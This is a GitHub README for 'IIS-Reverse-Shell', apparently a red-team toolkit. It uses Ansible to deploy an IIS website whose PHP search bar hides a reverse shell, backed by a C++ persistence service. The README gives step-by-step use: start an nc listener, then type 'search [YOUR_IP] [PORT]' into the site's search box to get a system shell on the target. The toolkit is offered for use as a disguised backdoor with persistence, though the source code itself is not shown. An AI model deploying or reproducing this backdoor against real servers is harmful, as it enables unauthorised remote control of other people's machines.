# IIS-Reverse-Shell

## Overview
This project demonstrates setting up a reverse shell on an IIS server. It includes:

- **Ansible Playbooks**: Automate the deployment and configuration of the IIS server.
- **PHP Scripts**: Facilitate the reverse shell functionality.
- **Website Content**: HTML and related assets for the web interface.

## Repository Structure

<pre>IIS-Reverse-Shell/
├── Ansible/
│   ├── iis_setup.yml
│   ├── inventory.yml
│   └── ansible.cfg
├── Images/
│   └── UB_Lockdown/
│       ├── gallery1.jpg
│       ├── gallery2.jpg
│       ├── gallery3.jpg
│       ├── Sponsor1.png
│       └── logo.png
├── PHP/
│   ├── contact.php
│   ├── search.php
│   └── php.ini
├── Persistence/
│   ├── Main.cpp
│   ├── Service.h
│   ├── Service.cpp
│   ├── Persistence.h
│   ├── Persistence.cpp
│   └── Website Manager Service.exe
└── Website/
    ├── UB_Lockdown.html
    ├── button.js
    └── web.config
</pre>

### Directory Breakdown
- **`Ansible/`**: Contains playbooks and inventory files for automating server setup.
- **`Images/UB_Lockdown/`**: Directory with images used in the website.
- **`PHP/`**: Contains the PHP script for the reverse shell.
- **`Persistence/`**: Contains the C++ executable service that maintains persistence on the server.
- **`Website/`**: HTML and CSS files for the website's frontend.

## Setup Instructions

### Prerequisites
- **Ansible**: Installed on the control machine.
- **Windows Server**: With WinRM running and enabled.
- **Network Configuration**: Ensure the server is accessible and that required ports are properly configured.
- **Required Ansible Packages**:
  ```sh
  ansible-galaxy collection install ansible.windows community.windows
  pip install pywinrm
  ```

### Steps

## 1. Clone the Repository
```bash
cd ~
git clone https://github.com/Lcdemi/IIS-Reverse-Shell
cd IIS-Reverse-Shell/Ansible
```

## 2. Configure Ansible Inventory
Edit the inventory.yml file to include your server's details:

```yaml
all:
  hosts:
    [IP_1]
    [IP_2]
    ...
    [IP_X]
  vars:
    ansible_user: your_username
    ansible_password: your_password
    ansible_connection: winrm
    ansible_port: 5985
    ansible_winrm_transport: ntlm
    ansible_winrm_server_cert_validation: ignore
```

## 3. Run the Ansible Playbook
To set up the IIS server and deploy the website, execute the following command:

```sh
ansible-playbook -i inventory.yml iis_setup.yml
```

## 4. Spawn a Reverse Shell
To spawn a reverse shell, follow these steps:

1. **Set Up a Listener**: On your machine, start a listener using a tool like `netcat`. For example:
   ```bash
   nc -lvnp [PORT]
   ```
2. **Trigger the Reverse Shell**: Once the deployment is complete, open your browser and navigate to: http://your_server_ip/. On the deployed website, locate the search bar. Enter the following command:
    ```html
    search [YOUR_IP] [PORT]
    ```
    Replace `[YOUR_IP]` with your machine's IP address and `[PORT]` with the port you are listening on (e.g., `8080`).

3. **Gain Access**: Once the command is executed, a system shell will be spawned, and you will have access to the target machine.
